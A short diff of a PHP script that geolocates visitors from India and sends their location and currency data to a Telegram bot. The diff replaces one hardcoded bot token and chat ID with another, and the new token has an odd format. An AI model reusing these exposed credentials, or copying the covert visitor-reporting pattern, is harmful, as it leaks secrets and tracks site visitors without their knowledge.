@@ -22,8 +22,8 @@ if ($geolocation['geoplugin_countryName'] === 'India') {
   $message .= "Exchange Rate: " . $geolocation['geoplugin_currencyConverter'] . "\n";
 
   // Send message to Telegram bot
-  $botToken = '5835202537:AAHBSMCm8FpYy5jPrfSsbm5CvCENmahkQME';
-  $chatId = '835275615';
+  $botToken = '5086819565:6690032683:AAHmnsM6DqinqMSaSi-ToZLk3QDvHNYdVPg';
+  $chatId = '4151190036';
   $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&disable_web_page_preview=True&parse_mode=html&text=" . urlencode($message);
   $ch = curl_init($url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
